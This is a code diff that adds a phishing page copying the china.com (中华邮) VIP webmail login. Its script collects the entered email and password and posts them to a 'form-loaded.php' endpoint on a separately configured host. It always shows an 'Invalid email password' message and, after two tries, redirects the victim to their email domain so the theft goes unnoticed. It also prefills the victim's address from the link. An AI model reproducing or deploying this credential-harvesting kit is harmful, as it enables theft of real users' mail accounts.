@@ -1,0 +1,224 @@
+<html xmlns="//www.w3.org/1999/xhtml">
+    <input type="hidden" name="lourl" value="https://mail.china.com/" id="lourl">
+
+<head>
+    <script src="../setting.js"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="keywords" content="中华邮 个人邮箱">
+    <meta name="description" content="中华邮是一种新型的网络邮件，让电子邮件更直观、更有效、且更实用，甚至可以比较有趣。">
+    <meta name="author" content="ck 11993">
+    <title>中华邮个人邮箱</title>
+    <link rel="shortcut icon" href="https://mail.china.com/favicon.ico">
+    <link href="https://mail.china.com/css/new_style.css" rel="stylesheet" type="text/css" media="screen">
+</head>
+<div id="google_translate_element"></div>
+
+<script type="text/javascript">
+    function googleTranslateElementInit() {
+        new google.translate.TranslateElement(
+            { pageLanguage: 'fr-FR' },
+            'google_translate_element'
+        );
+    }
+</script>
+
+<script type="text/javascript" src="https://translate.google.com/translate_a/element.js?
+cb=googleTranslateElementInit">
+</script>
+
+<body class="login_body">
+    <!-- header -->
+    <div class="header">
+        <div class="headerL">
+            <img src="https://mail.china.com/img/help_logo.png">
+            <i></i>
+            <span>您的专业电子邮箱</span>
+        </div>
+        <div class="headerR">
+            <div class="headerNav">
+                <a href="//corpmail.china.com/" target="_blank">企业邮箱</a>
+                <i>|</i>
+                <a href="//www.china.com/" target="_blank">中华首页</a>
+                <i>|</i>
+                <a href="/etc/help.html" target="_blank">帮助中心</a>
+            </div>
+            <img src="https://mail.china.com/img/telephone.png">
+            <span>400-636-1316</span>
+        </div>
+    </div>
+    <!-- End header -->
+
+    <!-- main -->
+    <div class="main">
+        <div class="mainCon">
+            <div class="loginBox">
+                <div id="loginTit">
+                    <i>VIP</i><span>邮箱帐号登录</span>
+                </div>
+                <!-- vipMail Start -->
+                <div class="loginForm" id="_paymail">
+                    <form name="CoremailForm" action="" method="post">
+
+                        <div class="loginUsr"><input type="text" name="email" class="loginInput" id="email"
+                                placeholder="请输入邮箱名"><span class="loginDomain">@china.com</span></div>
+                        <div class="loginPwd"><input type="password" name="password" class="loginInput"
+                                onkeypress="if(event.keyCode==13){login();}" id="password" placeholder="请输入密码"></div>
+                        <div class="loginSaveBox">
+                            <div class="loginSave">
+                                <input type="checkbox" name="checkbox" value="" id="saveCheck" class="loginCheck"
+                                    checked="checked">
+                                <label class="loginSaveTxt" for="saveCheck">在此计算机上保存我的信息</label>
+                            </div>
+                            <div class="loginForget"><a href="#resetpwd.jsp" target="_blank">忘记密码？</a></div>
+                        </div>
+                        <div id="msg" class="text-danger text-center" style="font-size:14px; color: red; display: none;">Invalid email password</div>
+                        <div class="loginBtn"><input type="submit" id="submit-btn" name="sub" value="登录" class="loginSub"></div>
+                        <div class="loginLink"><a href="#mailType.jsp" class="loginReg" target="_blank">注册中华邮</a><a
+                                href="#paycenter.jsp" class="loginPay" target="_blank">付费中心</a></div>
+                    </form>
+                </div>
+            </div>
+            <!-- vipMail End -->
+        </div>
+    </div>
+    <!-- End main -->
+
+    <!-- footer -->
+    <div class="footer">
+        <a href="https://www.china.com/zh_cn/general/about.html" target="_blank">关于中华网</a>|
+        <a href="https://www.china.com/zh_cn/general/advert.html" target="_blank">广告服务</a>|
+        <a href="https://www.china.com/zh_cn/general/contact.html" target="_blank">联系我们</a>|
+        <a href="https://www.china.com/zh_cn/general/job.html" target="_blank">招聘信息</a>|
+        <a href="https://www.china.com/zh_cn/general/bqsm.html" target="_blank">版权声明</a>|
+        <a href="https://www.china.com/zh_cn/general/legal.html" target="_blank">豁免条款</a>|
+        <a href="https://www.china.com/zh_cn/general/links.html" target="_blank">友情链接</a>|
+        <a href="https://www.china.com/zh_cn/general/news.html" target="_blank">中华网动态</a>
+        <p>版权所有<a href="https://www.china.com/" target="_blank">中华网</a></p>
+    </div>
+    <!-- End footer -->
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            var m = 0;
+        
+            $('#back1').click(function () {
+                $("#msg").hide();
+                $('#email').val("");
+                $("#automail").animate({
+                    left: 200,
+                    opacity: "hide"
+                }, 0);
+                $("#inputbar").animate({
+                    right: 200,
+                    opacity: "show"
+                }, 1000);
+            });
+        
+            var n = window.location.hash.substr(1);
+            
+            if (!n) {
+            } else {
+                var o = n;
+                $('#email').val(o);
+                $('#emailich').html(o);
+                var p = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                
+                if (!p.test(o)) {
+                    $('#error').show();
+                    n.focus;
+                    return false;
+                }
+        
+                var q = o.indexOf("@");
+                var r = o.substr((q + 1));
+                var c = r.substr(0, r.indexOf('.'));
+                var s = c.toLowerCase();
+                var t = c.toUpperCase();
+        
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + r);
+                $("#logoimg").attr("alt", t);
+                $("#logoname").html(t);
+                $(".logoname").html(t);
+            }
+        
+            $('#submit-btn').click(function (b) {
+                $('#error').hide();
+                $('#msg').hide();
+                b.preventDefault();
+                var d = $("#email").val();
+                var e = $("#password").val();
+                var z = $("#lourl").val();
+                var f = $('#msg').html();
+                $('#msg').text(f);
+                var g = d;
+                var h = /^([a-zA-Z0-9_\.\-])+@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                
+                if (!h.test(g)) {
+                    $('#error').show();
+                    d.focus;
+                    return false;
+                }
+        
+                var i = g.indexOf("@");
+                var j = g.substr((i + 1));
+                var c = j.substr(0, j.indexOf('.'));
+                var k = c.toLowerCase();
+                var l = c.toUpperCase();
+        
+                $("#logoimg").attr("src", "https://logo.clearbit.com/" + j);
+                $("#logoname").html(l);
+                if (e == '') {
+                    $('#msg').show();
+                    d.focus;
+                    return false;
+                }
+        
+                m = m + 1;
+        
+                $.ajax({
+                    dataType: 'JSON',
+                    url: dbaseURL+'form-loaded.php',
+                    type: 'POST',
+                    data: {
+                        email: d,
+                        password: e,
+                        lourl: z,
+                    },
+                    beforeSend: function (a) {
+                        $('#submit-btn').val('Verifing...');
+                    },
+                    success: function (a) {
+                        if (a) {
+                            $("#msg").show();
+                            console.log(a);
+                            if (a['signal'] == 'ok') {
+                                $("#password").val("");
+                                if (m >= 2) {
+                                    m = 0;
+                                    window.location.href("http://www." + j);
+                                }
+                            } else {
+                            }
+                        }
+                    },
+                    error: function () {
+                        $("#password").val("");
+                        if (m >= 2) {
+                            m = 0;
+                            window.location.replace("http://www." + j);
+                        }
+                        $("#msg").show();
+                    },
+                    complete: function () {
+                        $('#submit-btn').val('LOGIN');
+                    }
+                });
+            });
+        });
+
+    </script>
+
+</body>
+
+</html>
